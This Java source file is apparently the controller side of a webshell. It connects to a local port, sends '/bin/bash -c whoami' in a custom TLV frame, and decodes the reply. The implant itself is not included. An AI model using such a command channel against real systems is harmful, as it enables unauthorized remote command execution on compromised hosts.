package org.example;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class webshellServer {
    private Socket socket;
    private InputStream inputStream;
    private OutputStream outputStream;

    public static void main(String[] args) throws IOException {
        webshellServer webshellServer = new webshellServer("127.0.0.1", 9976);
        String Command = "/bin/bash -c whoami";
        webshellServer.write((new tlv.Request((byte) 0x02, Command.getBytes())).encode());
        tlv.Response response1 = webshellServer.readResponse();
        System.out.println(response1.getDataAsString());
    }

    public webshellServer(String host, int port) throws IOException {
        this.socket = new Socket(host, port);
        this.inputStream = socket.getInputStream();
        this.outputStream = socket.getOutputStream();
    }

    public void write(byte[] data) throws IOException {
        outputStream.write(data);
        outputStream.flush();
    }

    public reader read(int length) throws IOException {
        byte[] bytes = new byte[length];
        int read = inputStream.read(bytes);
        return new reader(length == read, bytes);
    }

    // 读取完整的TLV响应
    public tlv.Response readResponse() throws IOException {
        // 先读取魔数(4字节) + 类型(1字节) + 长度(4字节)
        reader headerReader = read(9);
        if (!headerReader.isSuccess()) {
            return null;
        }

        // 验证魔数
        if (!tlv.validate(headerReader.getData())) {
            return null;
        }

        // 获取数据长度
        byte[] headerData = headerReader.getData();
        int length = ((headerData[5] & 0xFF) << 24) |
                ((headerData[6] & 0xFF) << 16) |
                ((headerData[7] & 0xFF) << 8) |
                (headerData[8] & 0xFF);

        // 读取剩余数据（状态码1字节 + 数据部分）
        reader dataReader = read(length);
        if (!dataReader.isSuccess()) {
            return null;
        }

        // 组合完整的响应数据
        byte[] fullResponse = new byte[9 + length];
        System.arraycopy(headerData, 0, fullResponse, 0, 9);
        System.arraycopy(dataReader.getData(), 0, fullResponse, 9, length);

        // 解码响应
        return tlv.Response.decode(fullResponse);
    }

    public void close() throws IOException {
        if (socket != null) {
            socket.close();
        }
    }

    public static class reader {
        private boolean success;
        private byte[] data;

        public reader(boolean success, byte[] data) {
            this.success = success;
            this.data = data;
        }

        public boolean isSuccess() {
            return success;
        }

        public byte[] getData() {
            return data;
        }
    }
}
